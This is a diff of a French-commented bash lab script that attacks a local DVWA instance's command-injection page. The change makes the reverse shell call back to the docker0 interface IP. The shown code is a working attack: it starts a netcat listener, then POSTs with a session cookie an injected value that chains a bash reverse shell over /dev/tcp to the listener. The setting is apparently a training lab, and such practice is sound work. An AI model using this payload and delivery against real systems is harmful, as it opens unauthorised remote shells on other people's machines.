@@ -43,13 +43,15 @@ curl -s -b "PHPSESSID=$SESSION;security=low" \
 echo ""
 echo "--- 3. Reverse shell (optionnel: bash lab_cmdi.sh reverseshell) ---"
 if [ "${1:-}" = "reverseshell" ]; then
-  echo "[*] Démarrage du listener sur $LHOST:$LPORT"
+  # L'IP du conteneur pour joindre Kali est docker0 (pas l'IP de l'interface physique)
+  DOCKER_HOST=$(ip -4 addr show docker0 2>/dev/null | grep -oP 'inet \K[\d.]+' || echo "172.17.0.1")
+  echo "[*] Démarrage du listener sur $DOCKER_HOST:$LPORT"
   echo "[*] Envoi du payload reverse shell..."
-   echo "Payload: 127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+  echo "Payload: 127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$DOCKER_HOST/$LPORT 0>&1'"
   # Démarrer listener en arrière-plan
   timeout 10 nc -lvnp "$LPORT" &
   sleep 1
-  PAYLOAD="127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
+  PAYLOAD="127.0.0.1; bash -c 'exec bash -i >& /dev/tcp/$DOCKER_HOST/$LPORT 0>&1'"
   curl -s -b "PHPSESSID=$SESSION;security=low" \
     -X POST "http://localhost:$DVWA_PORT/vulnerabilities/exec/" \
     --data-urlencode "ip=$PAYLOAD" \
